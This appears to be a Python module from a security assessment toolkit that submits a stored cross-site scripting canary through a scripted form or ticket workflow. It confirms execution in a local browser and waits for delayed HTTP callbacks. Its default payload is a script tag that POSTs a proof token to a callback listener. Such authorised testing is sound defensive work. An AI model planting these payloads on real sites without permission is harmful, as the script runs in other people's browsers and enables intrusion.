"""Explicit stored-content submission, browser canary, and delayed callback workflow."""

import hashlib
import importlib.util
import json
import math
import re
import secrets
import time
from pathlib import Path
from urllib.parse import parse_qs, unquote, urljoin, urlsplit

from fieldkit.core.assessment import COMMON_OPTIONS, NetworkModule, write_private
from fieldkit.core.browser_proof import BrowserProof, proof_evidence
from fieldkit.core.callbacks import CallbackCollector, correlate_receipts, read_receipts
from fieldkit.core.module import Option
from fieldkit.core.redaction import redact
from fieldkit.core.replay import bounded_json, execute_request, resolve_request, validate_request
from fieldkit.core.urls import normalize_url
from fieldkit.core.workflows import extract_value, substitute
from fieldkit.modules.assessment_helpers import response_summary

VARIABLE = re.compile(r"[A-Za-z_][A-Za-z0-9_]{0,63}\Z")
RESERVED = {"payload", "callback_url", "marker", "proof"}


def extract_identifier(response, spec):
    """Support IDs in JSON/HTML, response headers, and explicit Location components."""
    source = spec.get("source")
    if source in {"html", "json"}:
        return extract_value(response, spec)
    if source == "header":
        name = spec.get("name", "")
        if not isinstance(name, str) or not re.fullmatch(r"[A-Za-z0-9-]{1,100}", name):
            raise ValueError("Header extractor requires a bounded header name")
        value = response.headers.get(name.lower(), "")
    elif source == "location":
        location = response.headers.get("location", "")
        if not location:
            raise ValueError("Response has no Location header")
        parsed = urlsplit(urljoin(response.url, location))
        if spec.get("part", "query") == "query":
            values = parse_qs(parsed.query).get(spec.get("name"), [])
            if len(values) != 1:
                raise ValueError("Location query extractor must select exactly one value")
            value = values[0]
        elif spec.get("part") == "path":
            index = spec.get("index", -1)
            if type(index) is not int or not -100 <= index <= 100:
                raise ValueError("Location path index must be a bounded integer")
            try:
                value = unquote([p for p in parsed.path.split("/") if p][index])
            except IndexError as exc:
                raise ValueError("Location path index does not exist") from exc
        else:
            raise ValueError("Location extractor part must be query or path")
    else:
        raise ValueError("Extractor source must be html/json/header/location")
    if (
        not isinstance(value, str)
        or not value
        or len(value) > 8192
        or any(ord(c) < 32 for c in value)
    ):
        raise ValueError("Extracted identifier must be a bounded nonempty scalar")
    return value


def strings(value):
    if isinstance(value, dict):
        for item in value.values():
            yield from strings(item)
    elif isinstance(value, list):
        for item in value:
            yield from strings(item)
    elif isinstance(value, str):
        yield value


def check_url_template(value):
    if not isinstance(value, str) or not value or len(value) > 8192:
        raise ValueError("Workflow URLs must be bounded strings")
    parsed = urlsplit(value)
    if "{{" in parsed.scheme or "{{" in parsed.netloc or value.startswith("//"):
        raise ValueError("Workflow variables cannot alter a URL authority")


class StoredXSS(NetworkModule):
    name = "web/stored-xss"
    description = (
        "Chain explicit form/ticket workflows, instrumented browser canaries and delayed "
        "HTTP callbacks; distinguish local execution from unverified staff review."
    )
    options = COMMON_OPTIONS + (
        Option(
            "WORKFLOW_FILE",
            str,
            "",
            "JSON submission/extraction/browser workflow",
            "--workflow-file",
        ),
        Option(
            "CONFIRM_SUBMISSION",
            bool,
            False,
            "Execute the explicit stored-content submission",
            "--confirm-submission",
        ),
        Option("BROWSER", bool, True, "Verify the canary in local Chromium", "--browser"),
        Option("SCREENSHOT", bool, True, "Save a private browser screenshot", "--screenshot"),
        Option("BROWSER_WAIT", float, 2, "Local execution wait, 0-60 seconds", "--browser-wait"),
        Option(
            "REVIEW_WAIT",
            float,
            30,
            "Delayed callback wait, 0-3600 seconds within budget",
            "--review-wait",
        ),
        Option("MAX_STEPS", int, 20, "Maximum explicit HTTP workflow steps", "--max-steps"),
        Option(
            "MAX_BROWSER_REQUESTS",
            int,
            64,
            "Maximum scoped browser resource requests",
            "--max-browser-requests",
        ),
        Option(
            "BIND_HOST", str, "127.0.0.1", "Integrated callback listener address", "--bind-host"
        ),
        Option("PORT", int, 0, "Callback listener port; 0 selects an unused port", "--port"),
        Option(
            "PUBLIC_URL", str, "", "Advertised URL of an existing listener forward", "--public-url"
        ),
        Option(
            "CALLBACK_URL",
            str,
            "",
            "Existing registered full callback URL, with RECEIPTS_FILE",
            "--callback-url",
        ),
        Option(
            "RECEIPTS_FILE",
            str,
            "",
            "Existing collector receipts for CALLBACK_URL",
            "--receipts-file",
        ),
        Option(
            "PAYLOAD_TEMPLATE_FILE",
            str,
            "",
            "Optional template containing {{callback_url}} and {{proof}}",
            "--payload-template-file",
        ),
    )

    def validate(self, settings):
        if not settings["WORKFLOW_FILE"]:
            raise ValueError("Supply WORKFLOW_FILE with explicit submission and browser steps")
        if not settings["DRY_RUN"] and not settings["CONFIRM_SUBMISSION"]:
            raise ValueError("Active stored-content workflow requires CONFIRM_SUBMISSION")
        for name, maximum in (("MAX_STEPS", 100), ("MAX_BROWSER_REQUESTS", 1000)):
            if type(settings[name]) is not int or not 1 <= settings[name] <= maximum:
                raise ValueError(f"{name} must be 1-{maximum}")
        for name, maximum in (("BROWSER_WAIT", 60), ("REVIEW_WAIT", 3600)):
            if not math.isfinite(settings[name]) or not 0 <= settings[name] <= maximum:
                raise ValueError(f"{name} must be finite and 0-{maximum}")
        if type(settings["PORT"]) is not int or not 0 <= settings["PORT"] <= 65535:
            raise ValueError("PORT must be 0-65535")
        if bool(settings["CALLBACK_URL"]) != bool(settings["RECEIPTS_FILE"]):
            raise ValueError("External callback requires CALLBACK_URL and RECEIPTS_FILE together")
        if settings["CALLBACK_URL"]:
            parsed = urlsplit(normalize_url(settings["CALLBACK_URL"]))
            if (
                parsed.query
                or parsed.fragment
                or not re.fullmatch(r"[A-Za-z0-9_-]{16,128}", parsed.path.rsplit("/", 1)[-1])
            ):
                raise ValueError(
                    "External callback requires a registered marker path and no query/fragment"
                )
        if (
            settings["BROWSER"]
            and not settings["DRY_RUN"]
            and importlib.util.find_spec("playwright") is None
        ):
            raise ValueError("Browser proof requires the browser extra and Playwright Chromium")
        workflow = bounded_json(settings["WORKFLOW_FILE"], min(settings["MAX_BYTES"], 1048576))
        if not isinstance(workflow, dict):
            raise ValueError("Workflow must be an object")
        variables = workflow.get("variables", {})
        if (
            not isinstance(variables, dict)
            or len(variables) > 100
            or any(
                not isinstance(k, str)
                or not VARIABLE.fullmatch(k)
                or k in RESERVED
                or not isinstance(v, (str, int, float, bool))
                or len(str(v)) > 8192
                for k, v in variables.items()
            )
        ):
            raise ValueError("Workflow variables must be bounded scalar values with unique names")
        steps = workflow.get("steps")
        if not isinstance(steps, list) or not 1 <= len(steps) <= settings["MAX_STEPS"]:
            raise ValueError("Workflow requires a bounded nonempty steps list")
        seen, payload_steps = set(), 0
        for index, step in enumerate(steps, 1):
            if not isinstance(step, dict):
                raise ValueError("Workflow steps must be objects")
            step["id"] = str(step.get("id", index))
            if not VARIABLE.fullmatch(step["id"]) or step["id"] in seen:
                raise ValueError("Step IDs must be unique bounded names")
            seen.add(step["id"])
            step["request"] = validate_request(step.get("request"))
            request = step["request"]
            if request["method"] not in {"GET", "HEAD", "POST"}:
                raise ValueError("Stored-content steps support GET/HEAD/POST only")
            check_url_template(request["url"])
            bodies = {
                k: request[k] for k in ("form", "json", "xml", "body", "data") if k in request
            }
            if any("{{payload}}" in value for value in strings(bodies)):
                if request["method"] != "POST":
                    raise ValueError("The canary must be in a POST body")
                payload_steps += 1
            expected = step.get("expect", {})
            statuses = expected.get("statuses") if isinstance(expected, dict) else None
            if (
                not isinstance(statuses, list)
                or not statuses
                or any(type(s) is not int or not 100 <= s <= 599 for s in statuses)
            ):
                raise ValueError("Each step requires explicit expect.statuses")
            if "contains" in expected and not isinstance(expected["contains"], str):
                raise ValueError("expect.contains must be a string")
            extraction = step.get("extract", {})
            if (
                not isinstance(extraction, dict)
                or len(extraction) > 100
                or any(
                    not isinstance(k, str)
                    or not VARIABLE.fullmatch(k)
                    or k in RESERVED
                    or not isinstance(v, dict)
                    or v.get("source") not in {"json", "html", "header", "location"}
                    for k, v in extraction.items()
                )
            ):
                raise ValueError(
                    "Extractors require named json/html/header/location specifications"
                )
        if payload_steps != 1:
            raise ValueError("Workflow must contain exactly one POST step using {{payload}}")
        browser = workflow.get("browser")
        if not isinstance(browser, dict):
            raise ValueError("Workflow requires a browser object with an explicit URL")
        check_url_template(browser.get("url"))
        if any("{{" + k + "}}" in browser["url"] for k in RESERVED):
            raise ValueError(
                "Browser URL cannot carry the canary/proof; use the stored ticket identifier"
            )
        if "profile" in browser and (
            not isinstance(browser["profile"], str) or not browser["profile"]
        ):
            raise ValueError("Browser profile must be a nonempty name")
        self._template = ""
        if settings["PAYLOAD_TEMPLATE_FILE"]:
            path = Path(settings["PAYLOAD_TEMPLATE_FILE"]).expanduser()
            with path.open("rb") as stream:
                raw = stream.read(65537)
            if len(raw) > 65536:
                raise ValueError("Payload template exceeds 64 KiB")
            self._template = raw.decode("utf-8")
            if not all("{{" + key + "}}" in self._template for key in ("callback_url", "proof")):
                raise ValueError("Payload template must include {{callback_url}} and {{proof}}")
        self._workflow = workflow

    async def assess(self, ctx):
        try:
            await self._assess(ctx)
        except (ValueError, OSError) as exc:
            # Exceptions can contain target-controlled URLs, payloads and credentials.
            ctx.report["errors"].append({"error": "workflow_failed", "detail": str(exc)[:300]})
            ctx.report["partial"] = True

    async def _assess(self, ctx):
        collector = browser = None
        variables = dict(self._workflow.get("variables", {}))
        ctx.secrets.extend(str(v) for v in variables.values())
        # Validate all origins/profiles before starting the listener or submitting anything.
        for step in self._workflow["steps"]:
            resolve_request(ctx, step["request"])
        browser_spec = self._workflow["browser"]
        resolve_request(
            ctx,
            {
                "url": browser_spec["url"],
                "profile": browser_spec.get("profile", ctx.settings["PROFILE"]),
            },
        )
        proof = "fieldkit-execution-" + secrets.token_hex(24)
        proof_digest = hashlib.sha256(proof.encode()).hexdigest()
        ctx.secrets.append(proof)
        try:
            if ctx.settings["CALLBACK_URL"]:
                callback_url = normalize_url(ctx.settings["CALLBACK_URL"])
                marker = urlsplit(callback_url).path.rsplit("/", 1)[-1]
            else:
                collector = CallbackCollector(
                    ctx,
                    bind_host=ctx.settings["BIND_HOST"],
                    port=ctx.settings["PORT"],
                    public_url=ctx.settings["PUBLIC_URL"],
                    max_receipts=100,
                    max_bytes=min(ctx.settings["MAX_BYTES"], 16384),
                )
                await collector.start()
                callback_url = collector.register(methods={"POST"}, body_sha256=proof_digest)
                marker = callback_url.rstrip("/").rsplit("/", 1)[-1]
            variables.update(callback_url=callback_url, marker=marker, proof=proof)
            payload = self._template or (
                "<script>fetch("
                + json.dumps(callback_url)
                + ',{method:"POST",mode:"no-cors",credentials:"omit",body:'
                + json.dumps(proof)
                + "})</script>"
            )
            if self._template:
                payload = substitute(self._template, variables)
            variables["payload"] = payload
            ctx.secrets.append(payload)
            if ctx.settings["BROWSER"]:
                browser = BrowserProof(
                    ctx, callback_url, proof, max_requests=ctx.settings["MAX_BROWSER_REQUESTS"]
                )
                await browser.start()  # Preflight Chromium before any state-changing step.
            record = {
                "kind": "stored-xss-workflow",
                "callback_url": callback_url,
                "marker": marker,
                "steps": [],
                "outcome": "inconclusive",
                "browser": {"outcome": "not_run"},
                "external_callback": {"outcome": "not_observed", "staff_identity_verified": False},
                "review_wait_seconds": ctx.settings["REVIEW_WAIT"],
                "evidence": [],
            }
            ctx.report["results"].append(record)
            if collector:
                record["receipts_file"] = str(collector.receipts_file.relative_to(ctx.store.root))
            ctx.store.write_report(redact(ctx.report, ctx.secrets))
            submitted_at = time.time()
            for step in self._workflow["steps"]:
                request = validate_request(substitute(step["request"], variables))
                request["id"] = step["id"]
                response, _ = await execute_request(ctx, request, label="stored-content-step")
                result = {
                    "id": step["id"],
                    "response": response_summary(response),
                    "outcome": "inconclusive",
                }
                record["steps"].append(result)
                record["evidence"].append(response.evidence_id)
                expected = substitute(step["expect"], variables)
                if (
                    response.error
                    or response.status not in expected["statuses"]
                    or (
                        "contains" in expected
                        and expected["contains"].encode() not in response.body
                    )
                ):
                    result["detail"] = "Response did not meet the explicit workflow expectation"
                    record["outcome"] = "baseline_failed"
                    ctx.report["errors"].append(
                        {"error": "workflow_expectation_failed", "request_id": step["id"]}
                    )
                    ctx.report["partial"] = True
                    return
                for name, spec in step.get("extract", {}).items():
                    value = extract_identifier(response, spec)
                    variables[name] = value
                    if not spec.get("public", False):
                        ctx.secrets.append(value)
                result["extracted_variables"] = list(step.get("extract", {}))
                result["outcome"] = "matched"
                ctx.store.write_report(redact(ctx.report, ctx.secrets))
            write_private(
                ctx.store.root / "private-raw/workflow-variables.json",
                json.dumps(variables, indent=2),
            )
            record["private_variables"] = {
                "file": "private-raw/workflow-variables.json",
                "private_raw": True,
            }
            record["identifiers"] = {
                name: variables[name]
                for step in self._workflow["steps"]
                for name, spec in step.get("extract", {}).items()
                if spec.get("public", False)
            }
            browser_url = substitute({"url": browser_spec["url"]}, variables)["url"]
            resolved = resolve_request(
                ctx,
                {
                    "url": browser_url,
                    "profile": browser_spec.get("profile", ctx.settings["PROFILE"]),
                },
            )
            if browser:
                record["browser"] = await browser.render(
                    resolved["url"],
                    resolved["profile"],
                    wait_seconds=ctx.settings["BROWSER_WAIT"],
                    screenshot=ctx.settings["SCREENSHOT"],
                )
                record["evidence"].extend(record["browser"]["evidence"])
            ctx.store.write_report(redact(ctx.report, ctx.secrets))
            if collector:
                receipts = await collector.wait(marker, submitted_at, ctx.settings["REVIEW_WAIT"])
            else:
                # External collectors can continue collecting while the job waits.
                receipts = await self._external_receipts(
                    ctx, marker, callback_url, submitted_at, proof_digest
                )
            record["external_callback"].update(
                outcome="observed" if receipts else "not_observed",
                receipts=receipts,
                attribution="HTTP callback observed; staff identity/privilege is unverified",
            )
            record["evidence"].extend(
                r["evidence"]
                for r in receipts
                if r.get("evidence") in {e["id"] for e in ctx.report["evidence"]}
            )
            local = record["browser"]["outcome"] == "confirmed"
            stored = local and record["browser"].get("marker_present_in_document", False)
            record["outcome"] = (
                "confirmed"
                if stored
                else "callback_observed"
                if receipts
                else "inconclusive"
                if record["browser"]["outcome"] == "inconclusive"
                else "not_observed"
            )
            record["evidence"].append(proof_evidence(ctx, record, "stored-content-workflow"))
            if stored:
                ctx.finding(
                    "stored-xss",
                    "Stored canary executed in an instrumented browser",
                    resolved["url"],
                    severity="medium",
                    confidence="confirmed",
                    evidence=record["evidence"],
                    tested_profile=resolved["profile"],
                    staff_identity_verified=False,
                )
            elif receipts:
                ctx.finding(
                    "callback-observed",
                    "Stored-content canary produced an external HTTP callback",
                    resolved["url"],
                    evidence=record["evidence"],
                    confidence="observed",
                    staff_identity_verified=False,
                )
        finally:
            try:
                if browser:
                    await browser.close()
            finally:
                if collector:
                    await collector.close()

    async def _external_receipts(self, ctx, marker, url, since, digest):
        import asyncio

        finish = min(ctx.deadline, time.monotonic() + ctx.settings["REVIEW_WAIT"])
        while True:
            path = Path(ctx.settings["RECEIPTS_FILE"]).expanduser()
            matches = []
            if path.is_file():
                records = read_receipts(path, max_bytes=min(ctx.settings["MAX_BYTES"], 1048576))
                matches = correlate_receipts(
                    records, marker, url, since, methods={"POST"}, body_sha256=digest
                )
            if matches:
                evidence = proof_evidence(
                    ctx,
                    {"receipts": matches, "source_file": str(path)},
                    "external-callback-receipts",
                )
                return [{**r, "evidence": evidence} for r in matches]
            if time.monotonic() >= finish:
                return []
            await asyncio.sleep(min(0.2, finish - time.monotonic()))
